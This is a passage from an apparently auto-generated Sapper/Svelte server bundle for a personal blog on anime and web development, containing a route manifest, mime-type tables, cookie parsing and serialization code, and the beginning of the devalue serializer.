			pattern: /^\/posts\/ACG-expression-of-light-and-heavy\/?$/,
			handlers: route_23,
			params: () => ({})
		},

		{
			// posts/ACG-understanding-staff-of-anime.md
			pattern: /^\/posts\/ACG-understanding-staff-of-anime\/?$/,
			handlers: route_24,
			params: () => ({})
		},

		{
			// posts/ACG-Pause-And-Select-Apocalypse.md
			pattern: /^\/posts\/ACG-Pause-And-Select-Apocalypse\/?$/,
			handlers: route_25,
			params: () => ({})
		},

		{
			// posts/ACG-anime-and-verstand-of-adult.md
			pattern: /^\/posts\/ACG-anime-and-verstand-of-adult\/?$/,
			handlers: route_26,
			params: () => ({})
		},

		{
			// posts/ACG-reconguista-in-g-interview.md
			pattern: /^\/posts\/ACG-reconguista-in-g-interview\/?$/,
			handlers: route_27,
			params: () => ({})
		},

		{
			// posts/ACG-curse-of-anime-evangelion.md
			pattern: /^\/posts\/ACG-curse-of-anime-evangelion\/?$/,
			handlers: route_28,
			params: () => ({})
		},

		{
			// posts/ACG-doujin-contention-history.md
			pattern: /^\/posts\/ACG-doujin-contention-history\/?$/,
			handlers: route_29,
			params: () => ({})
		},

		{
			// posts/ACG-linda-cube-on-ps-archive.md
			pattern: /^\/posts\/ACG-linda-cube-on-ps-archive\/?$/,
			handlers: route_30,
			params: () => ({})
		},

		{
			// posts/ACG-petition-of-sakuga-otaku.md
			pattern: /^\/posts\/ACG-petition-of-sakuga-otaku\/?$/,
			handlers: route_31,
			params: () => ({})
		},

		{
			// posts/ACG-game-contention-history.md
			pattern: /^\/posts\/ACG-game-contention-history\/?$/,
			handlers: route_32,
			params: () => ({})
		},

		{
			// posts/ACG-linda-cube-introduction.md
			pattern: /^\/posts\/ACG-linda-cube-introduction\/?$/,
			handlers: route_33,
			params: () => ({})
		},

		{
			// posts/f2e-05-editor-and-extension.md
			pattern: /^\/posts\/f2e-05-editor-and-extension\/?$/,
			handlers: route_34,
			params: () => ({})
		},

		{
			// posts/ACG-history-of-robot-anime.md
			pattern: /^\/posts\/ACG-history-of-robot-anime\/?$/,
			handlers: route_35,
			params: () => ({})
		},

		{
			// posts/ACG-thought-about-re-take.md
			pattern: /^\/posts\/ACG-thought-about-re-take\/?$/,
			handlers: route_36,
			params: () => ({})
		},

		{
			// posts/ACG-emotion-of-mother-00.md
			pattern: /^\/posts\/ACG-emotion-of-mother-00\/?$/,
			handlers: route_37,
			params: () => ({})
		},

		{
			// posts/google-sheet-as-database.md
			pattern: /^\/posts\/google-sheet-as-database\/?$/,
			handlers: route_38,
			params: () => ({})
		},

		{
			// posts/ACG-ginza-demonstration.md
			pattern: /^\/posts\/ACG-ginza-demonstration\/?$/,
			handlers: route_39,
			params: () => ({})
		},

		{
			// posts/ACG-theory-of-traveller.md
			pattern: /^\/posts\/ACG-theory-of-traveller\/?$/,
			handlers: route_40,
			params: () => ({})
		},

		{
			// posts/ACG-anime-report-2019.md
			pattern: /^\/posts\/ACG-anime-report-2019\/?$/,
			handlers: route_41,
			params: () => ({})
		},

		{
			// posts/make-chrome-extension.md
			pattern: /^\/posts\/make-chrome-extension\/?$/,
			handlers: route_42,
			params: () => ({})
		},

		{
			// posts/ACG-making-of-linda3.md
			pattern: /^\/posts\/ACG-making-of-linda3\/?$/,
			handlers: route_43,
			params: () => ({})
		},

		{
			// posts/ACG-sexual-illusion.md
			pattern: /^\/posts\/ACG-sexual-illusion\/?$/,
			handlers: route_44,
			params: () => ({})
		},

		{
			// posts/push-page-to-github.md
			pattern: /^\/posts\/push-page-to-github\/?$/,
			handlers: route_45,
			params: () => ({})
		},

		{
			// posts/regular-expression.md
			pattern: /^\/posts\/regular-expression\/?$/,
			handlers: route_46,
			params: () => ({})
		},

		{
			// posts/ACG-eoe-interview.md
			pattern: /^\/posts\/ACG-eoe-interview\/?$/,
			handlers: route_47,
			params: () => ({})
		},

		{
			// posts/f2e-03-javascript.md
			pattern: /^\/posts\/f2e-03-javascript\/?$/,
			handlers: route_48,
			params: () => ({})
		},

		{
			// posts/google-app-script.md
			pattern: /^\/posts\/google-app-script\/?$/,
			handlers: route_49,
			params: () => ({})
		},

		{
			// posts/ACG-on-your-mark.md
			pattern: /^\/posts\/ACG-on-your-mark\/?$/,
			handlers: route_50,
			params: () => ({})
		},

		{
			// posts/blog-with-svelte.md
			pattern: /^\/posts\/blog-with-svelte\/?$/,
			handlers: route_51,
			params: () => ({})
		},

		{
			// posts/f2e-07-unittest.md
			pattern: /^\/posts\/f2e-07-unittest\/?$/,
			handlers: route_52,
			params: () => ({})
		},

		{
			// posts/blog-with-hexo.md
			pattern: /^\/posts\/blog-with-hexo\/?$/,
			handlers: route_53,
			params: () => ({})
		},

		{
			// posts/f2e-00-summary.md
			pattern: /^\/posts\/f2e-00-summary\/?$/,
			handlers: route_54,
			params: () => ({})
		},

		{
			// posts/f2e-06-devtool.md
			pattern: /^\/posts\/f2e-06-devtool\/?$/,
			handlers: route_55,
			params: () => ({})
		},

		{
			// posts/vue-cheatsheet.md
			pattern: /^\/posts\/vue-cheatsheet\/?$/,
			handlers: route_56,
			params: () => ({})
		},

		{
			// posts/f2e-08-e-tool.md
			pattern: /^\/posts\/f2e-08-e-tool\/?$/,
			handlers: route_57,
			params: () => ({})
		},

		{
			// posts/markdown-test.md
			pattern: /^\/posts\/markdown-test\/?$/,
			handlers: route_58,
			params: () => ({})
		},

		{
			// posts/css-tailwind.md
			pattern: /^\/posts\/css-tailwind\/?$/,
			handlers: route_59,
			params: () => ({})
		},

		{
			// posts/editor-Emmet.md
			pattern: /^\/posts\/editor-Emmet\/?$/,
			handlers: route_60,
			params: () => ({})
		},

		{
			// posts/free-hosting.md
			pattern: /^\/posts\/free-hosting\/?$/,
			handlers: route_61,
			params: () => ({})
		},

		{
			// posts/vue-gridsome.md
			pattern: /^\/posts\/vue-gridsome\/?$/,
			handlers: route_62,
			params: () => ({})
		},

		{
			// posts/web-security.md
			pattern: /^\/posts\/web-security\/?$/,
			handlers: route_63,
			params: () => ({})
		},

		{
			// posts/webpack-note.md
			pattern: /^\/posts\/webpack-note\/?$/,
			handlers: route_64,
			params: () => ({})
		},

		{
			// posts/f2e-01-html.md
			pattern: /^\/posts\/f2e-01-html\/?$/,
			handlers: route_65,
			params: () => ({})
		},

		{
			// posts/css-doodle.md
			pattern: /^\/posts\/css-doodle\/?$/,
			handlers: route_66,
			params: () => ({})
		},

		{
			// posts/f2e-02-css.md
			pattern: /^\/posts\/f2e-02-css\/?$/,
			handlers: route_67,
			params: () => ({})
		},

		{
			// posts/f2e-04-git.md
			pattern: /^\/posts\/f2e-04-git\/?$/,
			handlers: route_68,
			params: () => ({})
		},

		{
			// posts/md2gslides.md
			pattern: /^\/posts\/md2gslides\/?$/,
			handlers: route_69,
			params: () => ({})
		},

		{
			// posts/twitch-api.md
			pattern: /^\/posts\/twitch-api\/?$/,
			handlers: route_70,
			params: () => ({})
		},

		{
			// posts/css-susy3.md
			pattern: /^\/posts\/css-susy3\/?$/,
			handlers: route_71,
			params: () => ({})
		},

		{
			// posts/tool-list.md
			pattern: /^\/posts\/tool-list\/?$/,
			handlers: route_72,
			params: () => ({})
		},

		{
			// posts/docsify.md
			pattern: /^\/posts\/docsify\/?$/,
			handlers: route_73,
			params: () => ({})
		},

		{
			// posts/aviutl.md
			pattern: /^\/posts\/aviutl\/?$/,
			handlers: route_74,
			params: () => ({})
		},

		{
			// posts/docker.md
			pattern: /^\/posts\/docker\/?$/,
			handlers: route_75,
			params: () => ({})
		},

		{
			// posts/nodecg.md
			pattern: /^\/posts\/nodecg\/?$/,
			handlers: route_76,
			params: () => ({})
		},

		{
			// posts/svelte.md
			pattern: /^\/posts\/svelte\/?$/,
			handlers: route_77,
			params: () => ({})
		},

		{
			// posts/react.md
			pattern: /^\/posts\/react\/?$/,
			handlers: route_78,
			params: () => ({})
		},

		{
			// posts/mpv.md
			pattern: /^\/posts\/mpv\/?$/,
			handlers: route_79,
			params: () => ({})
		},

		{
			// posts/vue.md
			pattern: /^\/posts\/vue\/?$/,
			handlers: route_80,
			params: () => ({})
		},

		{
			// [slug].json.js
			pattern: /^\/([^\/]+?)\.json$/,
			handlers: route_81,
			params: match => ({ slug: d(match[1]) })
		}
	],

	pages: [
		{
			// index.svelte
			pattern: /^\/$/,
			parts: [
				{ name: "index", file: "index.svelte", component: Index, preload: preload }
			]
		},

		{
			// about.svelte
			pattern: /^\/about\/?$/,
			parts: [
				{ name: "about", file: "about.svelte", component: About }
			]
		},

		{
			// [slug].svelte
			pattern: /^\/([^\/]+?)\/?$/,
			parts: [
				{ name: "$slug", file: "[slug].svelte", component: Slug, preload: preload$1, params: match => ({ slug: d(match[1]) }) }
			]
		}
	],

	root: Layout,
	root_preload: () => {},
	error: Error$1
};

const build_dir = "__sapper__/build";

/**
 * Create a `Writable` store that allows both updating and reading by subscription.
 * @param {*=}value initial value
 * @param {StartStopNotifier=}start start and stop notifications for subscriptions
 */
function writable(value, start = noop) {
    let stop;
    const subscribers = [];
    function set(new_value) {
        if (safe_not_equal(value, new_value)) {
            value = new_value;
            if (!stop) {
                return; // not ready
            }
            subscribers.forEach((s) => s[1]());
            subscribers.forEach((s) => s[0](value));
        }
    }
    function update(fn) {
        set(fn(value));
    }
    function subscribe(run, invalidate = noop) {
        const subscriber = [run, invalidate];
        subscribers.push(subscriber);
        if (subscribers.length === 1) {
            stop = start(set) || noop;
        }
        run(value);
        return () => {
            const index = subscribers.indexOf(subscriber);
            if (index !== -1) {
                subscribers.splice(index, 1);
            }
            if (subscribers.length === 0) {
                stop();
            }
        };
    }
    return { set, update, subscribe };
}

const CONTEXT_KEY = {};

/* src/node_modules/@sapper/internal/App.svelte generated by Svelte v3.4.4 */

const App = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	

	let { stores, error, status, segments, level0, level1 = null, notify } = $$props;

	afterUpdate(notify);
	setContext(CONTEXT_KEY, stores);

	if ($$props.stores === void 0 && $$bindings.stores && stores !== void 0) $$bindings.stores(stores);
	if ($$props.error === void 0 && $$bindings.error && error !== void 0) $$bindings.error(error);
	if ($$props.status === void 0 && $$bindings.status && status !== void 0) $$bindings.status(status);
	if ($$props.segments === void 0 && $$bindings.segments && segments !== void 0) $$bindings.segments(segments);
	if ($$props.level0 === void 0 && $$bindings.level0 && level0 !== void 0) $$bindings.level0(level0);
	if ($$props.level1 === void 0 && $$bindings.level1 && level1 !== void 0) $$bindings.level1(level1);
	if ($$props.notify === void 0 && $$bindings.notify && notify !== void 0) $$bindings.notify(notify);

	return `


	${validate_component(Layout, 'Layout').$$render($$result, Object.assign({ segment: segments[0] }, level0.props), {}, {
		default: () => `
		${ error ? `${validate_component(Error$1, 'Error').$$render($$result, { error: error, status: status }, {}, {})}` : `${validate_component(((level1.component) || missing_component), 'svelte:component').$$render($$result, Object.assign(level1.props), {}, {})}` }
	`
	})}`;
});

/**
 * @param typeMap [Object] Map of MIME type -> Array[extensions]
 * @param ...
 */
function Mime() {
  this._types = Object.create(null);
  this._extensions = Object.create(null);

  for (var i = 0; i < arguments.length; i++) {
    this.define(arguments[i]);
  }

  this.define = this.define.bind(this);
  this.getType = this.getType.bind(this);
  this.getExtension = this.getExtension.bind(this);
}

/**
 * Define mimetype -> extension mappings.  Each key is a mime-type that maps
 * to an array of extensions associated with the type.  The first extension is
 * used as the default extension for the type.
 *
 * e.g. mime.define({'audio/ogg', ['oga', 'ogg', 'spx']});
 *
 * If a type declares an extension that has already been defined, an error will
 * be thrown.  To suppress this error and force the extension to be associated
 * with the new type, pass `force`=true.  Alternatively, you may prefix the
 * extension with "*" to map the type to extension, without mapping the
 * extension to the type.
 *
 * e.g. mime.define({'audio/wav', ['wav']}, {'audio/x-wav', ['*wav']});
 *
 *
 * @param map (Object) type definitions
 * @param force (Boolean) if true, force overriding of existing definitions
 */
Mime.prototype.define = function(typeMap, force) {
  for (var type in typeMap) {
    var extensions = typeMap[type].map(function(t) {return t.toLowerCase()});
    type = type.toLowerCase();

    for (var i = 0; i < extensions.length; i++) {
      var ext = extensions[i];

      // '*' prefix = not the preferred type for this extension.  So fixup the
      // extension, and skip it.
      if (ext[0] == '*') {
        continue;
      }

      if (!force && (ext in this._types)) {
        throw new Error(
          'Attempt to change mapping for "' + ext +
          '" extension from "' + this._types[ext] + '" to "' + type +
          '". Pass `force=true` to allow this, otherwise remove "' + ext +
          '" from the list of extensions for "' + type + '".'
        );
      }

      this._types[ext] = type;
    }

    // Use first extension as default
    if (force || !this._extensions[type]) {
      var ext = extensions[0];
      this._extensions[type] = (ext[0] != '*') ? ext : ext.substr(1);
    }
  }
};

/**
 * Lookup a mime type based on extension
 */
Mime.prototype.getType = function(path) {
  path = String(path);
  var last = path.replace(/^.*[/\\]/, '').toLowerCase();
  var ext = last.replace(/^.*\./, '').toLowerCase();

  var hasPath = last.length < path.length;
  var hasDot = ext.length < last.length - 1;

  return (hasDot || !hasPath) && this._types[ext] || null;
};

/**
 * Return file extension associated with a mime type
 */
Mime.prototype.getExtension = function(type) {
  type = /^\s*([^;\s]*)/.test(type) && RegExp.$1;
  return type && this._extensions[type.toLowerCase()] || null;
};

var Mime_1 = Mime;

var standard = {"application/andrew-inset":["ez"],"application/applixware":["aw"],"application/atom+xml":["atom"],"application/atomcat+xml":["atomcat"],"application/atomsvc+xml":["atomsvc"],"application/bdoc":["bdoc"],"application/ccxml+xml":["ccxml"],"application/cdmi-capability":["cdmia"],"application/cdmi-container":["cdmic"],"application/cdmi-domain":["cdmid"],"application/cdmi-object":["cdmio"],"application/cdmi-queue":["cdmiq"],"application/cu-seeme":["cu"],"application/dash+xml":["mpd"],"application/davmount+xml":["davmount"],"application/docbook+xml":["dbk"],"application/dssc+der":["dssc"],"application/dssc+xml":["xdssc"],"application/ecmascript":["ecma","es"],"application/emma+xml":["emma"],"application/epub+zip":["epub"],"application/exi":["exi"],"application/font-tdpfr":["pfr"],"application/geo+json":["geojson"],"application/gml+xml":["gml"],"application/gpx+xml":["gpx"],"application/gxf":["gxf"],"application/gzip":["gz"],"application/hjson":["hjson"],"application/hyperstudio":["stk"],"application/inkml+xml":["ink","inkml"],"application/ipfix":["ipfix"],"application/java-archive":["jar","war","ear"],"application/java-serialized-object":["ser"],"application/java-vm":["class"],"application/javascript":["js","mjs"],"application/json":["json","map"],"application/json5":["json5"],"application/jsonml+json":["jsonml"],"application/ld+json":["jsonld"],"application/lost+xml":["lostxml"],"application/mac-binhex40":["hqx"],"application/mac-compactpro":["cpt"],"application/mads+xml":["mads"],"application/manifest+json":["webmanifest"],"application/marc":["mrc"],"application/marcxml+xml":["mrcx"],"application/mathematica":["ma","nb","mb"],"application/mathml+xml":["mathml"],"application/mbox":["mbox"],"application/mediaservercontrol+xml":["mscml"],"application/metalink+xml":["metalink"],"application/metalink4+xml":["meta4"],"application/mets+xml":["mets"],"application/mods+xml":["mods"],"application/mp21":["m21","mp21"],"application/mp4":["mp4s","m4p"],"application/msword":["doc","dot"],"application/mxf":["mxf"],"application/n-quads":["nq"],"application/n-triples":["nt"],"application/octet-stream":["bin","dms","lrf","mar","so","dist","distz","pkg","bpk","dump","elc","deploy","exe","dll","deb","dmg","iso","img","msi","msp","msm","buffer"],"application/oda":["oda"],"application/oebps-package+xml":["opf"],"application/ogg":["ogx"],"application/omdoc+xml":["omdoc"],"application/onenote":["onetoc","onetoc2","onetmp","onepkg"],"application/oxps":["oxps"],"application/patch-ops-error+xml":["xer"],"application/pdf":["pdf"],"application/pgp-encrypted":["pgp"],"application/pgp-signature":["asc","sig"],"application/pics-rules":["prf"],"application/pkcs10":["p10"],"application/pkcs7-mime":["p7m","p7c"],"application/pkcs7-signature":["p7s"],"application/pkcs8":["p8"],"application/pkix-attr-cert":["ac"],"application/pkix-cert":["cer"],"application/pkix-crl":["crl"],"application/pkix-pkipath":["pkipath"],"application/pkixcmp":["pki"],"application/pls+xml":["pls"],"application/postscript":["ai","eps","ps"],"application/pskc+xml":["pskcxml"],"application/raml+yaml":["raml"],"application/rdf+xml":["rdf","owl"],"application/reginfo+xml":["rif"],"application/relax-ng-compact-syntax":["rnc"],"application/resource-lists+xml":["rl"],"application/resource-lists-diff+xml":["rld"],"application/rls-services+xml":["rs"],"application/rpki-ghostbusters":["gbr"],"application/rpki-manifest":["mft"],"application/rpki-roa":["roa"],"application/rsd+xml":["rsd"],"application/rss+xml":["rss"],"application/rtf":["rtf"],"application/sbml+xml":["sbml"],"application/scvp-cv-request":["scq"],"application/scvp-cv-response":["scs"],"application/scvp-vp-request":["spq"],"application/scvp-vp-response":["spp"],"application/sdp":["sdp"],"application/set-payment-initiation":["setpay"],"application/set-registration-initiation":["setreg"],"application/shf+xml":["shf"],"application/sieve":["siv","sieve"],"application/smil+xml":["smi","smil"],"application/sparql-query":["rq"],"application/sparql-results+xml":["srx"],"application/srgs":["gram"],"application/srgs+xml":["grxml"],"application/sru+xml":["sru"],"application/ssdl+xml":["ssdl"],"application/ssml+xml":["ssml"],"application/tei+xml":["tei","teicorpus"],"application/thraud+xml":["tfi"],"application/timestamped-data":["tsd"],"application/voicexml+xml":["vxml"],"application/wasm":["wasm"],"application/widget":["wgt"],"application/winhlp":["hlp"],"application/wsdl+xml":["wsdl"],"application/wspolicy+xml":["wspolicy"],"application/xaml+xml":["xaml"],"application/xcap-diff+xml":["xdf"],"application/xenc+xml":["xenc"],"application/xhtml+xml":["xhtml","xht"],"application/xml":["xml","xsl","xsd","rng"],"application/xml-dtd":["dtd"],"application/xop+xml":["xop"],"application/xproc+xml":["xpl"],"application/xslt+xml":["xslt"],"application/xspf+xml":["xspf"],"application/xv+xml":["mxml","xhvml","xvml","xvm"],"application/yang":["yang"],"application/yin+xml":["yin"],"application/zip":["zip"],"audio/3gpp":["*3gpp"],"audio/adpcm":["adp"],"audio/basic":["au","snd"],"audio/midi":["mid","midi","kar","rmi"],"audio/mp3":["*mp3"],"audio/mp4":["m4a","mp4a"],"audio/mpeg":["mpga","mp2","mp2a","mp3","m2a","m3a"],"audio/ogg":["oga","ogg","spx"],"audio/s3m":["s3m"],"audio/silk":["sil"],"audio/wav":["wav"],"audio/wave":["*wav"],"audio/webm":["weba"],"audio/xm":["xm"],"font/collection":["ttc"],"font/otf":["otf"],"font/ttf":["ttf"],"font/woff":["woff"],"font/woff2":["woff2"],"image/aces":["exr"],"image/apng":["apng"],"image/bmp":["bmp"],"image/cgm":["cgm"],"image/dicom-rle":["drle"],"image/emf":["emf"],"image/fits":["fits"],"image/g3fax":["g3"],"image/gif":["gif"],"image/heic":["heic"],"image/heic-sequence":["heics"],"image/heif":["heif"],"image/heif-sequence":["heifs"],"image/ief":["ief"],"image/jls":["jls"],"image/jp2":["jp2","jpg2"],"image/jpeg":["jpeg","jpg","jpe"],"image/jpm":["jpm"],"image/jpx":["jpx","jpf"],"image/jxr":["jxr"],"image/ktx":["ktx"],"image/png":["png"],"image/sgi":["sgi"],"image/svg+xml":["svg","svgz"],"image/t38":["t38"],"image/tiff":["tif","tiff"],"image/tiff-fx":["tfx"],"image/webp":["webp"],"image/wmf":["wmf"],"message/disposition-notification":["disposition-notification"],"message/global":["u8msg"],"message/global-delivery-status":["u8dsn"],"message/global-disposition-notification":["u8mdn"],"message/global-headers":["u8hdr"],"message/rfc822":["eml","mime"],"model/3mf":["3mf"],"model/gltf+json":["gltf"],"model/gltf-binary":["glb"],"model/iges":["igs","iges"],"model/mesh":["msh","mesh","silo"],"model/stl":["stl"],"model/vrml":["wrl","vrml"],"model/x3d+binary":["*x3db","x3dbz"],"model/x3d+fastinfoset":["x3db"],"model/x3d+vrml":["*x3dv","x3dvz"],"model/x3d+xml":["x3d","x3dz"],"model/x3d-vrml":["x3dv"],"text/cache-manifest":["appcache","manifest"],"text/calendar":["ics","ifb"],"text/coffeescript":["coffee","litcoffee"],"text/css":["css"],"text/csv":["csv"],"text/html":["html","htm","shtml"],"text/jade":["jade"],"text/jsx":["jsx"],"text/less":["less"],"text/markdown":["markdown","md"],"text/mathml":["mml"],"text/mdx":["mdx"],"text/n3":["n3"],"text/plain":["txt","text","conf","def","list","log","in","ini"],"text/richtext":["rtx"],"text/rtf":["*rtf"],"text/sgml":["sgml","sgm"],"text/shex":["shex"],"text/slim":["slim","slm"],"text/stylus":["stylus","styl"],"text/tab-separated-values":["tsv"],"text/troff":["t","tr","roff","man","me","ms"],"text/turtle":["ttl"],"text/uri-list":["uri","uris","urls"],"text/vcard":["vcard"],"text/vtt":["vtt"],"text/xml":["*xml"],"text/yaml":["yaml","yml"],"video/3gpp":["3gp","3gpp"],"video/3gpp2":["3g2"],"video/h261":["h261"],"video/h263":["h263"],"video/h264":["h264"],"video/jpeg":["jpgv"],"video/jpm":["*jpm","jpgm"],"video/mj2":["mj2","mjp2"],"video/mp2t":["ts"],"video/mp4":["mp4","mp4v","mpg4"],"video/mpeg":["mpeg","mpg","mpe","m1v","m2v"],"video/ogg":["ogv"],"video/quicktime":["qt","mov"],"video/webm":["webm"]};

var lite = new Mime_1(standard);

function get_server_route_handler(routes) {
	async function handle_route(route, req, res, next) {
		req.params = route.params(route.pattern.exec(req.path));

		const method = req.method.toLowerCase();
		// 'delete' cannot be exported from a module because it is a keyword,
		// so check for 'del' instead
		const method_export = method === 'delete' ? 'del' : method;
		const handle_method = route.handlers[method_export];
		if (handle_method) {
			if (process.env.SAPPER_EXPORT) {
				const { write, end, setHeader } = res;
				const chunks = [];
				const headers = {};

				// intercept data so that it can be exported
				res.write = function(chunk) {
					chunks.push(Buffer.from(chunk));
					write.apply(res, arguments);
				};

				res.setHeader = function(name, value) {
					headers[name.toLowerCase()] = value;
					setHeader.apply(res, arguments);
				};

				res.end = function(chunk) {
					if (chunk) chunks.push(Buffer.from(chunk));
					end.apply(res, arguments);

					process.send({
						__sapper__: true,
						event: 'file',
						url: req.url,
						method: req.method,
						status: res.statusCode,
						type: headers['content-type'],
						body: Buffer.concat(chunks).toString()
					});
				};
			}

			const handle_next = (err) => {
				if (err) {
					res.statusCode = 500;
					res.end(err.message);
				} else {
					process.nextTick(next);
				}
			};

			try {
				await handle_method(req, res, handle_next);
			} catch (err) {
				console.error(err);
				handle_next(err);
			}
		} else {
			// no matching handler for method
			process.nextTick(next);
		}
	}

	return function find_route(req, res, next) {
		for (const route of routes) {
			if (route.pattern.test(req.path)) {
				handle_route(route, req, res, next);
				return;
			}
		}

		next();
	};
}

/*!
 * cookie
 * Copyright(c) 2012-2014 Roman Shtylman
 * Copyright(c) 2015 Douglas Christopher Wilson
 * MIT Licensed
 */

/**
 * Module exports.
 * @public
 */

var parse_1 = parse;
var serialize_1 = serialize;

/**
 * Module variables.
 * @private
 */

var decode = decodeURIComponent;
var encode = encodeURIComponent;
var pairSplitRegExp = /; */;

/**
 * RegExp to match field-content in RFC 7230 sec 3.2
 *
 * field-content = field-vchar [ 1*( SP / HTAB ) field-vchar ]
 * field-vchar   = VCHAR / obs-text
 * obs-text      = %x80-FF
 */

var fieldContentRegExp = /^[\u0009\u0020-\u007e\u0080-\u00ff]+$/;

/**
 * Parse a cookie header.
 *
 * Parse the given cookie header string into an object
 * The object has the various cookies as keys(names) => values
 *
 * @param {string} str
 * @param {object} [options]
 * @return {object}
 * @public
 */

function parse(str, options) {
  if (typeof str !== 'string') {
    throw new TypeError('argument str must be a string');
  }

  var obj = {};
  var opt = options || {};
  var pairs = str.split(pairSplitRegExp);
  var dec = opt.decode || decode;

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i];
    var eq_idx = pair.indexOf('=');

    // skip things that don't look like key=value
    if (eq_idx < 0) {
      continue;
    }

    var key = pair.substr(0, eq_idx).trim();
    var val = pair.substr(++eq_idx, pair.length).trim();

    // quoted values
    if ('"' == val[0]) {
      val = val.slice(1, -1);
    }

    // only assign once
    if (undefined == obj[key]) {
      obj[key] = tryDecode(val, dec);
    }
  }

  return obj;
}

/**
 * Serialize data into a cookie header.
 *
 * Serialize the a name value pair into a cookie string suitable for
 * http headers. An optional options object specified cookie parameters.
 *
 * serialize('foo', 'bar', { httpOnly: true })
 *   => "foo=bar; httpOnly"
 *
 * @param {string} name
 * @param {string} val
 * @param {object} [options]
 * @return {string}
 * @public
 */

function serialize(name, val, options) {
  var opt = options || {};
  var enc = opt.encode || encode;

  if (typeof enc !== 'function') {
    throw new TypeError('option encode is invalid');
  }

  if (!fieldContentRegExp.test(name)) {
    throw new TypeError('argument name is invalid');
  }

  var value = enc(val);

  if (value && !fieldContentRegExp.test(value)) {
    throw new TypeError('argument val is invalid');
  }

  var str = name + '=' + value;

  if (null != opt.maxAge) {
    var maxAge = opt.maxAge - 0;
    if (isNaN(maxAge)) throw new Error('maxAge should be a Number');
    str += '; Max-Age=' + Math.floor(maxAge);
  }

  if (opt.domain) {
    if (!fieldContentRegExp.test(opt.domain)) {
      throw new TypeError('option domain is invalid');
    }

    str += '; Domain=' + opt.domain;
  }

  if (opt.path) {
    if (!fieldContentRegExp.test(opt.path)) {
      throw new TypeError('option path is invalid');
    }

    str += '; Path=' + opt.path;
  }

  if (opt.expires) {
    if (typeof opt.expires.toUTCString !== 'function') {
      throw new TypeError('option expires is invalid');
    }

    str += '; Expires=' + opt.expires.toUTCString();
  }

  if (opt.httpOnly) {
    str += '; HttpOnly';
  }

  if (opt.secure) {
    str += '; Secure';
  }

  if (opt.sameSite) {
    var sameSite = typeof opt.sameSite === 'string'
      ? opt.sameSite.toLowerCase() : opt.sameSite;

    switch (sameSite) {
      case true:
        str += '; SameSite=Strict';
        break;
      case 'lax':
        str += '; SameSite=Lax';
        break;
      case 'strict':
        str += '; SameSite=Strict';
        break;
      case 'none':
        str += '; SameSite=None';
        break;
      default:
        throw new TypeError('option sameSite is invalid');
    }
  }

  return str;
}

/**
 * Try decoding a string using a decoding function.
 *
 * @param {string} str
 * @param {function} decode
 * @private
 */

function tryDecode(str, decode) {
  try {
    return decode(str);
  } catch (e) {
    return str;
  }
}

var cookie = {
	parse: parse_1,
	serialize: serialize_1
};

var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$';
var unsafeChars = /[<>\b\f\n\r\t\0\u2028\u2029]/g;
var reserved = /^(?:do|if|in|for|int|let|new|try|var|byte|case|char|else|enum|goto|long|this|void|with|await|break|catch|class|const|final|float|short|super|throw|while|yield|delete|double|export|import|native|return|switch|throws|typeof|boolean|default|extends|finally|package|private|abstract|continue|debugger|function|volatile|interface|protected|transient|implements|instanceof|synchronized)$/;
var escaped$1 = {
    '<': '\\u003C',
    '>': '\\u003E',
    '/': '\\u002F',
    '\\': '\\\\',
    '\b': '\\b',
    '\f': '\\f',
    '\n': '\\n',
    '\r': '\\r',
    '\t': '\\t',
    '\0': '\\0',
    '\u2028': '\\u2028',
    '\u2029': '\\u2029'
};
var objectProtoOwnPropertyNames = Object.getOwnPropertyNames(Object.prototype).sort().join('\0');
function devalue(value) {
    var counts = new Map();
    function walk(thing) {
        if (typeof thing === 'function') {
            throw new Error("Cannot stringify a function");
        }
        if (counts.has(thing)) {
            counts.set(thing, counts.get(thing) + 1);
            return;
        }
        counts.set(thing, 1);
        if (!isPrimitive(thing)) {
            var type = getType(thing);
            switch (type) {
                case 'Number':
                case 'String':
                case 'Boolean':
                case 'Date':
                case 'RegExp':
                    return;
                case 'Array':
                    thing.forEach(walk);
                    break;
                case 'Set':
                case 'Map':
                    Array.from(thing).forEach(walk);
                    break;
                default:
                    var proto = Object.getPrototypeOf(thing);
                    if (proto !== Object.prototype &&
                        proto !== null &&
                        Object.getOwnPropertyNames(proto).sort().join('\0') !== objectProtoOwnPropertyNames) {
                        throw new Error("Cannot stringify arbitrary non-POJOs");
                    }
                    if (Object.getOwnPropertySymbols(thing).length > 0) {
                        throw new Error("Cannot stringify POJOs with symbolic keys");
                    }
                    Object.keys(thing).forEach(function (key) { return walk(thing[key]); });
            }
        }
    }
    walk(value);
    var names = new Map();
    Array.from(counts)
        .filter(function (entry) { return entry[1] > 1; })
        .sort(function (a, b) { return b[1] - a[1]; })
        .forEach(function (entry, i) {
        names.set(entry[0], getName(i));
    });
    function stringify(thing) {
        if (names.has(thing)) {
            return names.get(thing);
        }
        if (isPrimitive(thing)) {
            return stringifyPrimitive(thing);
        }
        var type = getType(thing);
        switch (type) {
            case 'Number':
            case 'String':
            case 'Boolean':
                return "Object(" + stringify(thing.valueOf()) + ")";
            case 'RegExp':
                return thing.toString();
            case 'Date':
                return "new Date(" + thing.getTime() + ")";
            case 'Array':
                var members = thing.map(function (v, i) { return i in thing ? stringify(v) : ''; });
                var tail = thing.length === 0 || (thing.length - 1 in thing) ? '' : ',';
                return "[" + members.join(',') + tail + "]";
            case 'Set':
            case 'Map':
                return "new " + type + "([" + Array.from(thing).map(stringify).join(',') + "])";
            default:
                var obj = "{" + Object.keys(thing).map(function (key) { return safeKey(key) + ":" + stringify(thing[key]); }).join(',') + "}";
                var proto = Object.getPrototypeOf(thing);
                if (proto === null) {
                    return Object.keys(thing).length > 0
                        ? "Object.assign(Object.create(null)," + obj + ")"
                        : "Object.create(null)";
                }
                return obj;
        }
    }
    var str = stringify(value);
    if (names.size) {
        var params_1 = [];
        var statements_1 = [];
        var values_1 = [];
        names.forEach(function (name, thing) {
            params_1.push(name);
            if (isPrimitive(thing)) {
                values_1.push(stringifyPrimitive(thing));
                return;
            }
            var type = getType(thing);
            switch (type) {
                case 'Number':
                case 'String':
                case 'Boolean':
                    values_1.push("Object(" + stringify(thing.valueOf()) + ")");
                    break;
                case 'RegExp':
                    values_1.push(thing.toString());
                    break;
                case 'Date':
                    values_1.push("new Date(" + thing.getTime() + ")");
                    break;
                case 'Array':
                    values_1.push("Array(" + thing.length + ")");
                    thing.forEach(function (v, i) {
                        statements_1.push(name + "[" + i + "]=" + stringify(v));
                    });
